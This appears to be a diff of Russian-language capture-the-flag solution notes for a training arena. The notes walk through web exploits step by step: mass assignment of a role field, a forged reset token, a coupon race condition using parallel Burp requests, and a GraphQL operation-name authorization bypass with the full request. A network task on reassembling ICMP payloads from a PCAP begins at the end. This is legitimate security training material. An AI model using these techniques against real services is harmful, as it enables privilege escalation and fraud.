@@ -1,4 +1,4 @@
-ЗАДАНИЕ 1
+ЗАДАНИЕ WEB 1
 https://ctf.82.202.138.50.sslip.io/arena/w1/register
 Открыть devtools - F12
 Получение роли происходит за счет добавления нового поля role: shiftlead
@@ -6,7 +6,7 @@ https://ctf.82.202.138.50.sslip.io/arena/w1/register
 В форме не стоит запрет на использование дополнительных полей
 Флаг RTK{mass_assignment_shiftlead}
 
-ЗАДАНИЕ 2
+ЗАДАНИЕ WEB 2
 Точка входа: https://ctf.82.202.138.50.sslip.io/arena/w2/
 Приложение экспорта ожидает, что reverse proxy передаст подтверждённого пользователя, но граница доверия настроена неверно. Получите JSON квартального экспорта. Не требуется обход чужих ID или эксплуатация файловой системы.
 //вывод страницы
@@ -48,7 +48,7 @@ Sec-Fetch-Dest: document
 Accept-Encoding: gzip, deflate, br
 Priority: u=0, i
 
-ЗАДАНИЕ 3
+ЗАДАНИЕ WEB 3
 Точка входа: https://ctf.82.202.138.50.sslip.io/arena/w3/
 
 Диагностическая версия восстановления доступа выдаёт время создания запроса и содержит клиентскую подсказку о legacy-схеме токена. Сформируйте действительный reset-token для пользователя auditor и получите флаг
@@ -91,7 +91,59 @@ GET /arena/w3/reset?user=auditor&token=f3d26b8b740c9b39 HTTP/2
 
 "flag":"RTK{predictable_reset_minute}","status":"diagnostic access granted"
 
-ЗАДАНИЕ 4
+ЗАДАНИЕ WEB 4
 Точка входа: https://ctf.82.202.138.50.sslip.io/arena/w4/
 
 Одноразовый купон должен давать один кредит, но проверка и изменение состояния разнесены во времени. Добейтесь баланса не менее трёх кредитов в одной cookie-сессии. Нагрузочное тестирование не нужно: достаточно нескольких одновременных запросов.
+
+Необходимо отправить несколько параллельных запросов к https://ctf.82.202.138.50.sslip.io/arena/w4/redeem
+это можно сделать с помощью Burp Suite
+на вкладке Repeater создать несколько запросов
+создать группу и объединить запросы в группу
+Выбрать тиа запроса - несколько параллельных запросов. Отпарвить несколько раз
+Проверить баланс https://ctf.82.202.138.50.sslip.io/arena/w4/status
+Флаг {"balance":5,"flag":"RTK{race_redeem_three_times}"}
+
+Задание WEB 5
+Точка входа: https://ctf.82.202.138.50.sslip.io/arena/w5/
+
+GraphQL API связывает авторизацию публикации с именем операции, выбранным клиентом. Интроспекция разрешена. Опубликуйте отчёт id: 7 с preview: false, не используя запрещённое имя операции PublishReport.
+
+Это задача на обход контроля доступа в GraphQL API через переименование операции. Суть в том, что сервер проверяет имя операции (в данном случае PublishReport) для авторизации, но клиент может назвать операцию как угодно. Нужно опубликовать отчёт id: 7 с preview: false, используя другое имя операции, которое не запрещено.
+Используем метод POST
+
+Клиент работает с GraphQL endpoint /w5/graphql.
+https://ctf.82.202.138.50.sslip.io/arena/w5/ возвращает
+query Schema { __schema { mutationType { fields { name } } } }
+mutation PublishReport { publishReport(id: 7, preview: false) }
+Публикация должна быть доступна только сервисной операции PublishReport.
+
+/w5/graphql - правильная запись /arena/w5/graphql
+
+Запрос
+POST /arena/w5/graphql HTTP/2
+Host: ctf.82.202.138.50.sslip.io
+Cookie: session=36b0a95f-b66a-49f1-a003-1296d2ad4962.SQ_Jyehhj-Lg0EtO_iBCK_E0oPQ
+Content-Type: application/json
+Content-Length: 127
+//описание мутаций - это запрос, который меняет состояние сервера: добавляет, удаляет, изменяет данные. В вашей задаче мутация publishReport публикует отчёт.
+{
+  "operationName": "Publish",
+  "query": "mutation Publish { publishReport(id: 7, preview: false) { success message } }"
+}
+
+Флаг RTK{graphql_operation_name_bypass}
+
+ЗАДАНИЕ NET-01
+В PCAP смешаны ICMP Echo Reply нескольких диагностик. Найдите поток с указанными magic/identifier, удалите повтор и соберите payload по sequence.
+ICMP Echo Reply — это ответы на ping-запросы (тип 0, код 0).
+
+Идентификация потока — по полям:
+
+Identifier (идентификатор) — обычно 16-битное число, уникальное для каждого ping-процесса.
+
+Magic — возможно, указано в задании (например, конкретное значение в данных).
+
+Удаление повторов — в одном потоке могут быть дублирующиеся пакеты.
+
+Сборка payload — данные из ICMP-пакетов нужно собрать в правильном порядке по полю Sequence Number.
